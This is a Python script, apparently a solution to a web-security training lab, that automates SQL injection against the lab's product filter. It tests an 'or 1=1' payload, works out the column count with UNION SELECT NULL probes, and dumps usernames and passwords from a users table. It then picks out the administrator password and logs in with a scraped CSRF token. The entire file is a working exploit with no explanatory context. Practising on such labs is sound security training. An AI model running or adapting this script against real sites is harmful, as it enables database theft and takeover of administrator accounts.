import requests
from typing import Optional

session = requests.Session()

BASE_URL="https://0a1900c003d2c0da80f90ded00b0009f.web-security-academy.net"
FILTER_URL=BASE_URL+"/filter"
LOGIN_URL=BASE_URL+"/login"

def payload_request(payload:str) ->requests.Response:
    
    params={
        "category":payload
    }
    response = session.get(FILTER_URL,params=params, timeout=10)
    print(f"{response.status_code} {payload}")
    return response

def find_column_len()->int:
    for num in range(1,10):
        payload = f"' union select {",".join(["NULL"]*num)}-- "
        response = payload_request(payload)
        if response and response.status_code==200:
            return num

def find_user_request(column_len:int)->requests.Response:
    
    for num in range(0, column_len):
        arrs = ["NULL"] * column_len
        arrs[num] = "username"
        if (num+1)<column_len:
            arrs[num+1] = "password"
        payload = f"' union select {",".join(arrs)} from users-- "
        response = payload_request(payload)
        if response and response.status_code==200:
            return response

def find_pw(html:str) -> Optional[dict[str, str]]:
    from bs4 import BeautifulSoup
    soup= BeautifulSoup(html,"html.parser")
    table = soup.find("table",{"class":"is-table-longdescription"})
    trs = table.findAll("tr")
    for tr in trs:
        username = tr.find("th").text.strip()
        password = tr.find("td").text.strip()

        # 如果只想抓 administrator 的那筆
        if "administrator" in username:
            print(f"username:{username}, password:{password}")
            return password

def find_csrf()->str:
    response = session.get(LOGIN_URL, timeout=10)
    from bs4 import BeautifulSoup
    soup = BeautifulSoup(response.text,"html.parser")
    csrf_input = soup.find("input",{"name":"csrf"})
    return csrf_input.get("value")

def login(pw:str):
    data={
        "csrf":find_csrf(),
        "username":"administrator",
        "password":pw
    }
    response = session.post(LOGIN_URL, data=data, timeout=10)
    if "Your username is: administrator" in response.text:
        print("login success")

def main():
    payload_request("Gifts")
    payload_request("' or 1=1-- ")
    column_len = find_column_len()
    response = find_user_request(column_len=column_len)
    pw = find_pw(response.text)
    login(pw)

    

if __name__=="__main__":
    main()